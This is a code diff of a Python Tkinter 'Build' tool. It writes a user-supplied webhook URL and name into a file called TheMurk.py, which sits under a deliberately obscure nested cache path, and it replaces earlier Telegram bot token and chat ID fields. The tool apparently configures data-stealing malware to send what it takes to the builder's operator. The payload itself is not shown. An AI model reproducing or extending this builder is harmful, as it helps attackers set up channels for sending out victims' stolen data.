@@ -81,8 +81,8 @@ def build():
         with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'r') as f:
             old_data = f.read()
 
-        new_data = old_data.replace('userTOKEN = \'\'', f'userTOKEN = \'{token}\'')
-        new_data1 = new_data.replace('userCHAT_ID = \'\'', f'userCHAT_ID = \'{id}\'')
+        new_data = old_data.replace('urlWebHook = \'\'', f'urlWebHook = \'{token}\'')
+        new_data1 = new_data.replace('botName = \'\'', f'botName = \'{id}\'')
 
         with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as f:
             f.write(new_data1)
@@ -138,9 +138,9 @@ imageT = ImageTk.PhotoImage(imageT)
 imagesprite1 = canvas.create_image(400, 100, image=imageT)
 canvas.place(relx=0.5, rely=0.25, anchor=tkinter.CENTER)
 
-text = tkinter.Label(win, text='Telegram bot token',bg = '#242424',fg = '#B4B6B9',font=font1,bd='0')
+text = tkinter.Label(win, text='Webhook url:',bg = '#242424',fg = '#B4B6B9',font=font1,bd='0')
 input = tkinter.Entry(win,fg = '#B4B6B9',font=font2,width=32,bg='#343638',relief=tkinter.FLAT)
-text1 = tkinter.Label(win, text='Your Telegram ID',bg = '#242424',fg = '#B4B6B9',font=font1,bd='0')
+text1 = tkinter.Label(win, text='Webhook name:',bg = '#242424',fg = '#B4B6B9',font=font1,bd='0')
 input1 = tkinter.Entry(win,fg = '#B4B6B9',font=font2,width=32,bg='#343638',relief=tkinter.FLAT)
 cheack = tkinter.Checkbutton(win,text = 'I have all python libraries installed',font=font1,bg = butonNormalColor,fg = '#B4B6B9',indicatoron=0,bd = '0',activebackground=butonSelectedColor,activeforeground='#474849',selectcolor = '#242424',onvalue = 1,offvalue=0,variable=yes)
 button=tkinter.Button(win,text='Build',bg = butonNormalColor,fg = '#B4B6B9',font=font1,padx=30,pady=3,bd='0',activebackground=butonNormalColor,activeforeground='#474849',state=tkinter.NORMAL,command=build)
